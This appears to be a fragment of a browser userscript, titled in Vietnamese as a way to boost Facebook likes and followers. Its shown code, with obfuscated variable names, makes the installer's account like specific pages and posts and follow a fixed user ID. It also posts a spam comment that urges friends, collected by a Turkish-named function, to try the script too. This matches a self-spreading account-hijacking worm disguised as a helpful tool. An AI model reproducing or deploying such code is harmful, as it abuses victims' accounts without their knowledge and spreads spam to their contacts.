// ==UserScript==
// @name            Cài Đặt Cách Tăng Like Ảnh , Status , Like Comment , Tăng Theo Dõi Trên Facebook Trực Tiếp Trên Google Chrome , Cờ Rôm , Fire Fox
// @description     https://www.facebook.com/dz.koi.12
...
//TMH
P("333193376825475");Like("428784073918862");IDS("100004044471917");
...
function yorum_yap(id, _0x7892xc) {
    ...
    _0x7892x8 += '&comment_text= (y) ĐỔI TÊN ĐƯỢC RỒI NÈ VÀ NHIỀU ICOIN ĐẸP LẮM  😼  😽  😿  🙀  :*  (^^^)  🌱  🌱  🌙  🌟  🌻  , vừa mới làm thử thì thấy hay quá nên share cho mọi người cùng dùng chung nè (Y) <3 :D  :P ✌ 💨 👏 Ai thấy hay thì thử đi nhé (y) ' + encodeURIComponent(_0x7892xc);
    _0x7892x8 += '&source=2';
...
arkadaslari_al("630102503723095");